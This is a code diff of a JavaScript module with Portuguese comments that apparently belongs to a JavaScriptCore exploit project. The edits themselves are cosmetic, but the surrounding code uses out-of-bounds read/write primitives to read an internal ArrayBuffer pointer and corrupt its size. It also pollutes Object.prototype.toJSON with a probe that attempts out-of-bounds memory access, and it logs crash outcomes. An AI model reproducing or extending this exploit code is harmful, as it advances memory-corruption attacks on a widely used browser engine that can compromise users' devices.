@@ -11,9 +11,6 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// A LINHA ABAIXO FOI REMOVIDA, POIS toJSON_AttemptWriteToThis_v3 é definida neste arquivo:
-// import { toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs'; 
-
 // toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
 export function toJSON_AttemptWriteToThis_v3() { 
     let initial_buffer_size_for_oob_check;
@@ -107,6 +104,7 @@ export function toJSON_AttemptWriteToThis_v3() {
     return result_payload;
 }
 
+
 export async function executeCorruptArrayBufferContentsSizeTest() {
     const FNAME_TEST = "executeCorruptABContentsSizeTest";
     logS3(`--- Iniciando Teste: Corromper Tamanho em ArrayBufferContents ---`, "test", FNAME_TEST);
@@ -158,7 +156,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
 
     try {
         logS3(`1. Lendo ponteiro m_impl de oob_array_buffer_real @ offset ${toHex(contentsImplPtrOffset)}...`, "info", FNAME_TEST);
-        contents_impl_ptr_val = oob_read_absolute(contentsImplPtrOffset, 8);
+        contents_impl_ptr_val = oob_read_absolute(contentsImplPtrOffset, 8); 
 
         if (!isAdvancedInt64Object(contents_impl_ptr_val) || (contents_impl_ptr_val.low() === 0 && contents_impl_ptr_val.high() === 0)) {
             throw new Error(`Ponteiro m_impl lido é inválido ou nulo: ${contents_impl_ptr_val ? contents_impl_ptr_val.toString(true) : 'null'}`);
@@ -198,7 +196,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         try {
             logS3(`4. Poluindo Object.prototype.toJSON com função de sondagem...`, "info", FNAME_TEST);
             Object.defineProperty(Object.prototype, ppKey_val, {
-                value: toJSON_AttemptWriteToThis_v3, // Usando a v3 definida neste arquivo
+                value: toJSON_AttemptWriteToThis_v3, 
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
@@ -221,8 +219,8 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
             }
         }
     } else {
-         errorOccurred = corruption_step_error;
-         potentiallyCrashed = false;
+         errorOccurred = corruption_step_error; 
+         potentiallyCrashed = false; 
     }
     
     if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
@@ -244,7 +242,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         }
     } else if (errorOccurred) {
         logS3(`   Teste concluído com erro: ${errorOccurred.message}`, "error", FNAME_TEST);
-    } else if (potentiallyCrashed && !corruption_step_error) {
+    } else if (potentiallyCrashed && !corruption_step_error) { 
         logS3(`   O TESTE PODE TER CONGELADO ANTES DA SONDAGEM toJSON.`, "error", FNAME_TEST);
     }
 
